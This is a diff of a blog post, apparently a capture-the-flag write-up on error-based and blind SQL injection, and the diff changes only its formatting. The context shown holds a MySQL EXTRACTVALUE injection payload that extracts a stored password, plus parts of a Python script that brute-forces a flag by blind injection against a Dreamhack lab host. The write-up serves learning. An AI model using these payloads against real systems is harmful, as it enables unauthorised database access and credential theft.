@@ -7,8 +7,7 @@ title: error based sql injection
     <code>admin' AND (SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT upw FROM user LIMIT 1)))) -- --</code> 
     as the uid field. The other option is to do a conditional error based blind SQL injection. The exploit code is as below.
 </p>
-{% raw %}
-<pre><code>
+{% highlight python %}
 #!/usr/bin/python3
 import requests
 import urllib3
@@ -36,7 +35,7 @@ def binary_search(i:int) -> int:
 if __name__ == "__main__":
     url = "http://host3.dreamhack.games:11044/"
     s = requests.Session()
-    table = "!\"#$%&'()*+,-./0123456789:;&lt;=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
+    table = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
     flag = ""
     for i in range(1, 256):
         res = binary_search(i)
@@ -46,8 +45,7 @@ if __name__ == "__main__":
             flag += ch
             print(f"flag = {flag}")
     print(flag)
-</code></pre>
-{% endraw %}
+{% endhighlight %}
 <p>
     The payload has <code>-- --</code> at the end since the target website has a MySQL DB. 
     Also, I didn't know that MySQL handled characters in a case insensitive way, so it took me a while to realize I had to cast
